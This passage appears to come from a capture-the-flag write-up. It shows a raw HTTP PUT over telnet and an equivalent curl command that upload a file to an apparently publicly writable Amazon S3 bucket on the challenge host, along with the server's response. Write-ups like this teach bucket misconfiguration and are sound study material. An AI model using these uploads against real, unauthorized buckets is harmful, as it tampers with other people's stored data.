```
$ telnet files.filer.sect.ctf.rocks 80
PUT /abc.txt HTTP/1.1
Host: files.filer.sect.ctf.rocks
Date: Sat, 10 Sep 2016 09:21:02 GMT
Content-Type: text/plain
Content-Length: 32

/files/flag.php
/files/flag.php

HTTP/1.1 200 OK
x-amz-id-2: 3GLe0t1bgnmvrVbZic0CAjd8x5mwPBJRR6stEJj+e6/7x+8tZe0jteImuhxukQKZJFa6z0yOnrY=
x-amz-request-id: 3F732267A35970EC
Date: Sat, 10 Sep 2016 09:21:26 GMT
ETag: "c1f1b2f47ed3ad9c7785dc233fcb1ce5"
Content-Length: 0
Server: AmazonS3
```

Alternatively we can use `curl` for uploading any file:
```
$ curl -s -H "Content-Type:text/plain" http://files.filer.sect.ctf.rocks --upload-file abc.txt
```

References:

[https://docs.aws.amazon.com/AmazonS3/latest/API/RESTBucketPUT.html](https://docs.aws.amazon.com/AmazonS3/latest/API/RESTBucketPUT.html)
